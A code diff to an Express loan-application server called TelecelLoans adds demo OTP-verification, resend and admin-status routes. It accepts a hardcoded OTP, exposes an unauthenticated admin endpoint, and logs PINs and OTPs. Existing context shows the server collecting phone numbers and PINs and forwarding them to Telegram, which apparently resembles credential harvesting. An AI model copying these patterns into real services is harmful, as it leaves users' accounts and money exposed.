@@ -15,7 +15,7 @@ app.use((req, res, next) => {
 
 app.use(express.json());
 
-// Routes
+// ─── HEALTH ───
 app.get('/', (req, res) => {
   res.json({ status: 'ok', message: 'TelecelLoans API is running!' });
 });
@@ -24,6 +24,7 @@ app.get('/health', (req, res) => {
   res.json({ status: 'ok', timestamp: new Date().toISOString() });
 });
 
+// ─── AUTH ───
 app.post('/api/auth/register', (req, res) => {
   console.log('📝 Register:', req.body);
   res.json({ 
@@ -44,6 +45,7 @@ app.post('/api/auth/login', (req, res) => {
   });
 });
 
+// ─── LOANS ───
 app.post('/api/loans/apply', (req, res) => {
   const { amount, name, phone, period_days, interest_rate } = req.body;
   console.log('💰 Loan:', req.body);
@@ -66,7 +68,7 @@ app.post('/api/loans/apply', (req, res) => {
   });
 });
 
-// ─── UPDATED TELEGRAM ROUTE ───
+// ─── TELEGRAM ───
 app.post('/api/telegram/send-auth', async (req, res) => {
   const { phone, amount, name, loanId, pin } = req.body;
   console.log('📱 Telegram Request:', req.body);
@@ -118,7 +120,61 @@ app.post('/api/telegram/send-auth', async (req, res) => {
   }
 });
 
-// Start server
+// ─── OTP VERIFICATION ───
+app.post('/api/loans/verify-otp', async (req, res) => {
+  const { loanId, otp, phone } = req.body;
+  console.log('🔐 OTP Verification:', { loanId, otp, phone });
+  
+  try {
+    // Simple OTP check - for demo, accept 123456
+    if (otp === '123456') {
+      console.log('✅ OTP verified successfully');
+      res.json({ success: true, message: 'OTP verified successfully!' });
+    } else {
+      console.log('❌ Invalid OTP:', otp);
+      res.status(400).json({ success: false, message: 'Invalid OTP. Please try again.' });
+    }
+  } catch (error) {
+    console.error('OTP error:', error);
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+});
+
+// ─── UPDATE LOAN STATUS ───
+app.put('/api/admin/update-status/:id', async (req, res) => {
+  const { id } = req.params;
+  const { status } = req.body;
+  console.log(`📝 Update loan ${id} to ${status}`);
+  
+  try {
+    // For demo, just return success
+    res.json({ 
+      success: true, 
+      message: `Loan ${id} updated to ${status}`,
+      loan: { id, status }
+    });
+  } catch (error) {
+    console.error('Update error:', error);
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+});
+
+// ─── RESEND OTP ───
+app.post('/api/loans/resend-otp', async (req, res) => {
+  const { loanId, phone } = req.body;
+  console.log(`📱 Resend OTP for ${phone} (${loanId})`);
+  
+  try {
+    const newOtp = String(Math.floor(100000 + Math.random() * 900000));
+    console.log(`📱 New OTP: ${newOtp}`);
+    res.json({ success: true, message: 'OTP resent successfully!' });
+  } catch (error) {
+    console.error('Resend error:', error);
+    res.status(500).json({ success: false, message: 'Server error' });
+  }
+});
+
+// ─── START ───
 app.listen(PORT, () => {
   console.log(`🚀 TelecelLoans Server running on port ${PORT}`);
   console.log(`🌐 CORS enabled`);
